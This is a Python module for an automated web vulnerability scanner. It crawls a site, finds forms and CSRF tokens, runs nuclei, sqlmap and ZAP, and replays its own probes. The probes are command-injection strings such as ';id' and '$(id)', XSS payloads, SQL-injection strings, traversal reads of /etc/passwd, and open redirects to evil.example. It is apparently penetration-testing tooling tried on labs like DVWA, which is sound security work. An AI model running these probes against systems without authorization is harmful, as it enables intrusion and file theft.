"""Blind engagement runner: the real-world flow, with no hand-fed endpoints.

  crawl (blind, authenticated, logout-safe)
    -> discover forms + CSRF tokens
    -> build injection targets (url, method, params, csrf)
    -> run tools form-aware and CSRF-aware (each param tested)
    -> verify findings by deterministic replay (kill FPs)
    -> score

This is what runs against a real target: it does not know where the vulnerabilities are.
CSRF handling gets past per-request tokens on hardened forms; form-awareness tests POST
params; verification confirms each hit so a payload-set gap in one tool is caught by another
and false positives never reach the report.
"""

from __future__ import annotations

import json
import subprocess
import tempfile
from dataclasses import dataclass, field
from urllib.parse import urlsplit

from .orchestrator.forms import fetch_forms


@dataclass
class Target:
    url: str
    method: str = "GET"
    params: list[str] = field(default_factory=list)
    values: dict = field(default_factory=dict)
    csrf_field: str | None = None
    csrf_url: str = ""

    def data_string(self, mark: str = "1") -> str:
        return "&".join(f"{p}={self.values.get(p) or mark}" for p in self.params)


@dataclass
class Finding:
    tool: str
    category: str
    url: str
    param: str | None = None
    method: str = "GET"
    evidence: str = ""
    verified: bool | None = None       # None=unverified, True=confirmed, False=refuted
    verify_note: str = ""


def _run(args: list[str], timeout: int, stdin: str | None = None) -> str:
    try:
        p = subprocess.run(args, input=stdin, capture_output=True, text=True,
                           timeout=timeout, check=False)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as exc:  # noqa: BLE001
        return f"__EXEC_ERROR__ {exc}"


# ----- discovery --------------------------------------------------------------

def blind_crawl(target: str, cookie: str, depth: int = 3, duration: str = "3m") -> list[str]:
    """katana blind crawl (logout-safe, host-scoped, plain-URL output)."""
    args = ["katana", "-u", target, "-jc", "-silent", "-d", str(depth), "-ct", duration,
            "-cos", "logout|signout|/setup|reset", "-fs", "fqdn", "-kf", "all", "-c", "10"]
    if cookie:
        args += ["-H", f"Cookie: {cookie}"]
    out = _run(args, timeout=600)
    urls = sorted({ln.strip() for ln in out.splitlines() if ln.strip().startswith("http")})
    return urls


def discover_targets(urls: list[str], cookie: str, host: str) -> list[Target]:
    """Turn crawled URLs into injection targets: GET URLs with query params, and every
    discovered form (POST/GET) with its CSRF token."""
    targets: list[Target] = []
    seen: set = set()

    for u in urls:
        parts = urlsplit(u)
        if parts.query and (parts.hostname or host) == host:
            params = sorted({kv.split("=")[0] for kv in parts.query.split("&") if kv})
            key = (parts.path, "GET", tuple(params))
            if key not in seen:
                seen.add(key)
                targets.append(Target(url=u, method="GET", params=params))

    # forms (fetch each unique page once)
    for page in sorted({u.split("?")[0] for u in urls}):
        if (urlsplit(page).hostname or host) != host:
            continue
        for f in fetch_forms(page, cookie):
            ip = f.injectable_params()
            if not ip:
                continue
            key = (urlsplit(f.action).path, f.method, tuple(sorted(ip)))
            if key in seen:
                continue
            seen.add(key)
            targets.append(Target(url=f.action, method=f.method, params=ip, values=f.values,
                                  csrf_field=f.csrf_field, csrf_url=f.csrf_url))
    return targets


# ----- verification (deterministic replay) ------------------------------------

def verify_cmdi(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    """Replay a command-injection marker across common separators (incl. the bare-pipe
    bypass that DVWA-high allows). Confirms by the `id` command output signature."""
    import httpx
    seps = [";id", "|id", "| id", "&&id", "%0aid", "`id`", "$(id)"]
    headers = {"Cookie": cookie} if cookie else {}
    for sep in seps:
        payload = f"127.0.0.1{sep}"
        try:
            if method == "POST":
                r = httpx.post(url, data={param: payload, "Submit": "Submit"},
                               headers=headers, follow_redirects=True, timeout=12)
            else:
                r = httpx.get(url, params={param: payload}, headers=headers,
                              follow_redirects=True, timeout=12)
        except Exception:  # noqa: BLE001, S112
            continue
        if "uid=" in r.text and "gid=" in r.text:
            return True, f"cmd exec confirmed via '{sep}' (uid= in response)"
    return False, "no command output on replay"


def verify_reflected_xss(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    import httpx
    marker = "dxsc9k1z"
    payload = f"<sVg/onload=alert({marker})>"
    headers = {"Cookie": cookie} if cookie else {}
    try:
        if method == "POST":
            r = httpx.post(url, data={param: payload}, headers=headers,
                           follow_redirects=True, timeout=12)
        else:
            r = httpx.get(url, params={param: payload}, headers=headers,
                          follow_redirects=True, timeout=12)
    except Exception as exc:  # noqa: BLE001
        return False, f"replay error: {exc}"
    # confirmed only if the payload is reflected UN-encoded (real XSS, not encoded echo)
    if payload in r.text:
        return True, "payload reflected unencoded"
    if marker in r.text and "&lt;" in r.text:
        return False, "reflected but HTML-encoded (not exploitable)"
    return False, "not reflected"


# SQL-error signatures (MySQL/generic) — strong, low-FP.
_SQL_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
    "supplied argument is not a valid mysql", "sqlstate[", "unclosed quotation mark",
    "quoted string not properly terminated", "sql syntax.*mysql", "mysqli_",
    "pg_query", "psql:", "sqlite3::", "odbc sql", "microsoft ole db",
]
_REDIRECT_PARAMS = {"redirect", "url", "next", "return", "returnurl", "dest", "destination",
                    "go", "target", "rurl", "redir", "continue", "forward"}


def _req(method, url, param, value, cookie, follow=True):
    import httpx
    headers = {"Cookie": cookie} if cookie else {}
    # Include Submit=Submit: DVWA-style forms only process the input when the submit button
    # is present. Harmless extra param elsewhere.
    if method == "POST":
        return httpx.post(url, data={param: value, "Submit": "Submit"}, headers=headers,
                          follow_redirects=follow, timeout=12)
    return httpx.get(url, params={param: value, "Submit": "Submit"}, headers=headers,
                     follow_redirects=follow, timeout=12)


def verify_sqli(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    """Error-based (inject a quote -> DB error) then boolean-based (true vs false response
    length differs). Strong signatures only, to stay low false-positive."""
    try:
        err = _req(method, url, param, "1'\"", cookie).text.lower()
    except Exception as exc:  # noqa: BLE001
        return False, f"replay error: {exc}"
    for sig in _SQL_ERRORS:
        if sig in err:
            return True, f"SQL error signature: {sig!r}"
    # boolean-based: TRUE payload vs FALSE payload should differ materially
    try:
        t = _req(method, url, param, "1' OR '1'='1", cookie).text
        f = _req(method, url, param, "1' AND '1'='2", cookie).text
        base = _req(method, url, param, "1", cookie).text
    except Exception:  # noqa: BLE001
        return False, "boolean replay failed"
    if len(t) != len(f) and abs(len(t) - len(base)) < abs(len(f) - len(base)):
        return True, f"boolean-based diff (true={len(t)} false={len(f)} base={len(base)})"
    return False, "no SQL error or boolean signal"


def verify_lfi(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    """Local/Remote file read: try classic traversal + php filter wrappers, confirm by the
    /etc/passwd root line signature."""
    payloads = ["/etc/passwd", "../../../../../../etc/passwd",
                "....//....//....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=/etc/passwd"]
    for p in payloads:
        try:
            r = _req(method, url, param, p, cookie)
        except Exception:  # noqa: BLE001, S112
            continue
        if "root:x:0:0" in r.text:
            return True, f"read /etc/passwd via {p!r}"
        if "cm9vdDp4OjA6MDp" in r.text:  # base64 of 'root:x:0:0:'
            return True, f"read /etc/passwd (base64 filter) via {p!r}"
    return False, "no file-read signature"


def verify_open_redirect(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    """Only meaningful on redirect-ish params: inject an external URL and confirm the app
    issues a 30x Location to it (do NOT follow redirects)."""
    if param.lower() not in _REDIRECT_PARAMS:
        return False, "param not redirect-like"
    evil = "https://evil.example/x"
    try:
        r = _req(method, url, param, evil, cookie, follow=False)
    except Exception as exc:  # noqa: BLE001
        return False, f"replay error: {exc}"
    # 1) HTTP 30x Location header
    loc = r.headers.get("location", "")
    if r.status_code in (301, 302, 303, 307, 308) and "evil.example" in loc:
        return True, f"30x redirect to {loc}"
    # 2) body-based redirect: meta refresh / window.location / anchor to the injected URL
    body = r.text.lower()
    if "evil.example" in body:
        for pat in ("http-equiv=\"refresh\"", "http-equiv='refresh'", "window.location",
                    "location.href", "location.replace", "location.assign"):
            if pat in body:
                return True, f"body-based redirect ({pat}) to evil.example"
    return False, f"no external redirect (status {r.status_code})"


def verify_stored_xss(target: Target, param: str, cookie: str) -> tuple[bool, str]:
    """Inject via the form, then re-fetch the page and check the payload persisted unencoded."""
    import httpx
    marker = "stx7q2z"
    payload = f"<sVg/onload=alert({marker})>"
    headers = {"Cookie": cookie} if cookie else {}
    data = {p: (target.values.get(p) or "x") for p in target.params}
    data[param] = payload
    data.setdefault("Submit", "Submit")
    try:
        httpx.post(target.url, data=data, headers=headers, follow_redirects=True, timeout=12)
        view = httpx.get(target.csrf_url or target.url, headers=headers,
                         follow_redirects=True, timeout=12)
    except Exception as exc:  # noqa: BLE001
        return False, f"replay error: {exc}"
    if payload in view.text:
        return True, "stored payload persisted unencoded"
    return False, "not stored / encoded"


def verify_finding(f: Finding, cookie: str) -> Finding:
    if f.category == "command-injection":
        ok, note = verify_cmdi(f.url, f.param or "ip", f.method, cookie)
    elif f.category == "xss":
        ok, note = verify_reflected_xss(f.url, f.param or "", f.method, cookie)
    elif f.category == "sql-injection":
        ok, note = verify_sqli(f.url, f.param or "id", f.method, cookie)
    elif f.category == "file-inclusion":
        ok, note = verify_lfi(f.url, f.param or "page", f.method, cookie)
    elif f.category == "open-redirect":
        ok, note = verify_open_redirect(f.url, f.param or "redirect", f.method, cookie)
    else:
        f.verified = None
        f.verify_note = "tool-confirmed (no independent replay for this class)"
        return f
    f.verified = ok
    f.verify_note = note
    return f


# ----- detection (tool runners, form + CSRF aware) ----------------------------

def run_nuclei_dast(urls: list[str], cookie: str) -> list[Finding]:
    if not urls:
        return []
    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
        fh.write("\n".join(urls)); path = fh.name
    args = ["nuclei", "-l", path, "-dast", "-jsonl", "-silent"]
    if cookie:
        args += ["-H", f"Cookie: {cookie}"]
    out = _run(args, timeout=1800)
    from .scoring.normalize import normalize_nuclei
    return [Finding(tool="nuclei", category=n.category, url=n.url, param=n.param,
                    evidence=(n.raw.get("info", {}) or {}).get("name", ""))
            for n in normalize_nuclei(out)]


def run_sqlmap(t: Target, cookie: str) -> list[Finding]:
    """CSRF-aware sqlmap: passes --csrf-token/--csrf-url when the form carries a token."""
    args = ["sqlmap", "--batch", "--level", "2", "--risk", "2", "--disable-coloring",
            "--flush-session", "--technique=BEUST"]
    if t.method == "POST":
        args += ["-u", t.url, "--data", t.data_string()]
    else:
        args += ["-u", f"{t.url}?{t.data_string()}" if "?" not in t.url else t.url]
    if cookie:
        args += ["--cookie", cookie]
    if t.csrf_field:
        args += ["--csrf-token", t.csrf_field, "--csrf-url", t.csrf_url]
    out = _run(args, timeout=900)
    from .scoring.normalize import normalize_sqlmap
    return [Finding(tool="sqlmap", category="sql-injection", url=t.url, param=n.param,
                    method=t.method, evidence="sqlmap-confirmed")
            for n in normalize_sqlmap(out)]


def probe_targets(targets: list[Target], cookie: str) -> list[Finding]:
    """Completeness safety-net: independently replay EVERY blatant-vuln class on every
    discovered param, so a payload-set gap in any scanner does not become a missed finding.
    Deterministic, strong-signature checks only (low false-positive)."""
    out: list[Finding] = []

    def add(cat, url, param, method, note):
        out.append(Finding(tool="verify", category=cat, url=url, param=param,
                           method=method, evidence=note, verified=True))

    for t in targets:
        for param in t.params:
            ok, note = verify_cmdi(t.url, param, t.method, cookie)
            if ok:
                add("command-injection", t.url, param, t.method, note)
            ok, note = verify_reflected_xss(t.url, param, t.method, cookie)
            if ok:
                add("xss", t.url, param, t.method, note)
            ok, note = verify_sqli(t.url, param, t.method, cookie)
            if ok:
                add("sql-injection", t.url, param, t.method, note)
            ok, note = verify_lfi(t.url, param, t.method, cookie)
            if ok:
                add("file-inclusion", t.url, param, t.method, note)
            ok, note = verify_open_redirect(t.url, param, t.method, cookie)
            if ok:
                add("open-redirect", t.url, param, t.method, note)
            # stored XSS only makes sense on POST forms (inject then re-view the page)
            if t.method == "POST":
                ok, note = verify_stored_xss(t, param, cookie)
                if ok:
                    add("xss", t.url, param, t.method, f"stored: {note}")
    return out


def run_engagement(target: str, cookie: str, host: str, depth: int = 3, *,
                   dom: bool = True, tools: bool = True) -> dict:
    """Full blind flow covering BOTH profiles: blatant injection (DVWA-style) AND the
    hardened-app profile (config/passive + vulnerable JS + API + DOM-based). Returns
    {urls, targets, findings} with findings verified."""
    from .dom import dom_probe
    from .jsanalysis import analyze_js
    from .passive import passive_scan

    urls = blind_crawl(target, cookie, depth=depth)

    # JS/API discovery: pull API routes out of JS so unlinked endpoints get tested too.
    js_urls = [u for u in urls if u.split("?")[0].endswith(".js")]
    api_eps, vuln_libs = analyze_js(js_urls, cookie, host)
    urls = sorted(set(urls) | set(api_eps))

    targets = discover_targets(urls, cookie, host)
    findings: list[Finding] = []

    # 1) injection tools (breadth) + independent completeness probes (6 blatant classes)
    if tools:
        findings += run_nuclei_dast([t.url for t in targets if t.method == "GET" and t.params], cookie)
        for t in targets:
            if t.params:
                findings += run_sqlmap(t, cookie)
    findings = [verify_finding(f, cookie) for f in findings]
    findings += probe_targets(targets, cookie)

    # 2) passive/config (hardened-app bulk: headers, cookies, CORS, TLS hygiene)
    for pf in passive_scan(urls, cookie):
        findings.append(Finding(tool="passive", category=pf.category, url=pf.url,
                                param=pf.check, evidence=pf.detail, verified=True))

    # 3) vulnerable JS dependencies
    for vl in vuln_libs:
        findings.append(Finding(tool="jsanalysis", category="vulnerable-component", url=vl.url,
                                param=vl.library, evidence=f"{vl.library} {vl.version}: {vl.detail}",
                                verified=True))

    # 4) DOM-based (headless): DOM-XSS + DOM open-redirect on HTML pages
    if dom:
        html_pages = sorted({u.split("#")[0] for u in urls
                             if not u.split("?")[0].endswith((".js", ".css", ".png", ".jpg",
                                                              ".svg", ".ico", ".woff", ".map"))})
        # map discovered params per page for DOM source testing
        page_params: dict = {}
        for t in targets:
            page_params.setdefault(t.url.split("?")[0], set()).update(t.params)
        for pg in html_pages[:25]:
            for d in dom_probe(pg, cookie, params=sorted(page_params.get(pg, []))):
                findings.append(Finding(tool="dom", category=d.category, url=d.url,
                                        param=d.source, evidence=d.evidence, verified=True))

    # dedup by (category, path, param)
    seen: set = set(); uniq: list[Finding] = []
    for f in findings:
        k = (f.category, urlsplit(f.url).path, f.param)
        if k in seen:
            continue
        seen.add(k); uniq.append(f)
    return {
        "urls": urls, "targets": len(targets),
        "findings": [f.__dict__ for f in uniq],
    }


# ----- ZAP (passive categories + generative active scan, dockerized) ----------

def run_zap(target: str, cookie: str, out_dir: str, timeout: int = 2400) -> list[Finding]:
    """OWASP ZAP full-scan via docker (authenticated, logout-excluded). Adds the passive
    categories (CSRF, cookie/session hygiene, CSP, headers) and a generative active scan that
    corroborates injection classes. Requires a running docker (colima) + the zaproxy image."""
    import os

    from .scoring.normalize import normalize_zap
    ck = cookie.replace("; ", ";")
    zopts = (
        "-config replacer.full_list(0).description=auth "
        "-config replacer.full_list(0).enabled=true "
        "-config replacer.full_list(0).matchtype=REQ_HEADER "
        "-config replacer.full_list(0).matchstr=Cookie "
        "-config replacer.full_list(0).regex=false "
        f"-config replacer.full_list(0).replacement={ck} "
        "-config globalexcludeurl.url_list.url(0).regex=.*logout.* "
        "-config globalexcludeurl.url_list.url(0).enabled=true "
        "-config anticsrf.tokens.token(0).name=user_token "
        "-config anticsrf.tokens.token(0).enabled=true"
    )
    os.makedirs(out_dir, exist_ok=True)
    args = ["docker", "run", "--rm", "-v", f"{os.path.abspath(out_dir)}:/zap/wrk/:rw",
            "zaproxy/zap-stable", "zap-full-scan.py", "-t", target,
            "-J", "zap.json", "-j", "-I", "-z", zopts]
    _run(args, timeout=timeout)
    report_path = os.path.join(out_dir, "zap.json")
    if not os.path.exists(report_path):
        return []
    with open(report_path, encoding="utf-8") as fh:
        report = json.load(fh)
    out: list[Finding] = []
    for n in normalize_zap(report):
        out.append(Finding(tool="zap", category=n.category, url=n.url, param=n.param,
                           evidence=n.raw.get("name", "")))
    return out
